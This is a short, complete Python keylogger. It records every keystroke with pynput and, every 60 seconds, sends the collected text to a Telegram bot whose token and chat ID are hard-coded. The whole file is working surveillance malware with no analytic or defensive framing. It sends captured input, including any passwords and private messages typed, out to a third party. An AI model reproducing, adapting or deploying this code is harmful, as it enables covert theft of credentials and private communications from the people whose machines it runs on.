import pynput.keyboard
import threading
import requests

# Store keystrokes
log = ""

# Telegram Bot Token and Chat ID
BOT_TOKEN = "7515880089:AAEp2qz2jv_Leq2pmMKiZdy4uV_4Z_n_SNg" 
CHAT_ID = "1551078857"  

def callback_function(key):
    global log
    try:
        log += key.char  # Store the key pressed
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
        else:
            log += f" [{str(key)}] "  # Special keys

def send_to_telegram():
    global log
    if log:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {"chat_id": CHAT_ID, "text": f"🔴 Keylogger Logs:\n{log}"}

        try:
            response = requests.get(url, params=params)
            if response.status_code == 200:
                print("✅ Telegram Message Sent Successfully!")
                log = ""  # Clear log after sending
            else:
                print(f"[-] Failed to send message. Status Code: {response.status_code}")
        except Exception as e:
            print(f"[-] Error sending message to Telegram: {e}")

    # Schedule next message in 60 seconds
    threading.Timer(60, send_to_telegram).start()

# Start listening for keystrokes
with pynput.keyboard.Listener(on_press=callback_function) as listener:
    send_to_telegram()  # Start sending keystrokes to Telegram every 60 seconds
    listener.join()